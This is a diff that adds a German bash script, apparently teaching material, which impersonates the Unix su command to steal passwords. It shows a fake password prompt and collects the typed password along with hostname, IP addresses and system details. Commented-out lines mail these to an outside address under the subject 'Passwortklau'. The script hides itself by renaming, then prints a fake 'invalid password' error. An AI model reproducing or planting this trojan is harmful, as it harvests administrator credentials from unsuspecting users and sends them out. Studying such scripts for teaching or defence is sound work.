@@ -1,0 +1,53 @@
+#!/bin/bash
+# Gemeiner Ersatz für den su-Befehl
+TMP_FILE="su_tmp"
+SU_VISIBLE="su"
+SU_HIDDEN=".su"
+RENAME_SCRIPT="rename_su"
+SLEEP_TIME="10"
+
+# 1 Verhalten nachbilden
+echo -n "Passwort: "	# -n --> kein Zeilenumbruch
+read -s PASSWORD	# -s --> silent
+echo ""
+sleep 3			# 3s warten
+# jetzt alles weitere, sonst fällt eventuell die Verzögerung auf
+# echo "su: ungültiges Kennwort"
+
+# 2 Daten sammeln
+echo "Augerufener Befehl: $0 $1 $2 $3 $4"	>  $TMP_FILE
+echo "Passwort: $PASSWORD"			>> $TMP_FILE
+echo "Hostname: $HOSTNAME"			>> $TMP_FILE
+echo "IP Adressen:"				>> $TMP_FILE
+echo `/bin/ip addr | grep inet`			>> $TMP_FILE
+echo `uname -a`					>> $TMP_FILE
+echo "."					>> $TMP_FILE
+
+# 3 Nachricht versenden
+# Subject
+# Absender
+# Empfänger
+## mail -s "Passwortklau" \
+##	-r "bill.gates@microsoft.test" \
+##	"studierende@cs13.ba-leipzig.de" \
+##	< $TMP_FILE	# Eingabeumleitung, Inhalt TMP_File übergeben
+rm $TMP_FILE	# temporäre Datei löschen
+
+# 4 Verstecken
+# eigenen Namen ändern
+(mv $SU_VISIBLE $SU_HIDDEN && sleep $SLEEP_TIME && mv $SU_HIDDEN $SU_VISIBLE) &
+
+# 5 Reaktivieren
+# Script erzeugen
+## echo "#!/bin/bash"		>  $RENAME_SCRIPT
+## echo "rm $RENAME_SCRIPT"	>> $RENAME_SCRIPT # gleich löschen, ist ja im RAM
+## echo "sleep $SLEEP_TIME"	>> $RENAME_SCRIPT
+## echo "mv $SU_HIDDEN $SU_VISIBLE" >> $RENAME_SCRIPT
+## echo "exit 0"			>> $RENAME_SCRIPT
+# Script ausführen
+## chmod 755 $RENAME_SCRIPT	# ausführbar machen
+## ./$RENAME_SCRIPT &		# ausführen im Hintergrund
+
+# Abschluss: Fehler ungültiges Kennwort ausgeben
+echo "su: ungültiges Kennwort"
+exit 0
